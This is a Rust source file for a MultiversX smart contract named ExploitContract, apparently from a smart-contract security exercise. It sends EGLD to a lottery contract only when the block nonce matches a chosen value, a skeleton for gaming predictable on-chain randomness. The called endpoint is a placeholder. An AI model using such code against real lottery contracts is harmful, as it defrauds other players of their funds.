#![no_std]
use lottery::ProxyTrait as _;

multiversx_sc::imports!();

#[multiversx_sc::contract]
pub trait ExploitContract {
    #[init]
    fn init(&self, l_address: ManagedAddress) {
        self.lottery_address().set(l_address);
    }

    #[proxy]
    fn contract_proxy(&self, sc_address: ManagedAddress) -> lottery::Proxy<Self::Api>;
    
    #[view(lotteryAddress)]
    #[storage_mapper("lottery_address")]
    fn lottery_address(&self) -> SingleValueMapper<ManagedAddress>;

    #[endpoint(proxyCall)]
    fn caller_endpoint(&self, amount: BigUint, nonce: u64) {
        let callee_address = self.lottery_address().get();

        if self.blockchain().get_block_nonce() != nonce {
            sc_panic!("New block");
        }

        self.contract_proxy(callee_address.clone())
            .endpoint_name()
            .with_egld_transfer(amount.clone())
            .async_call()
            .call_and_exit();
    }
}
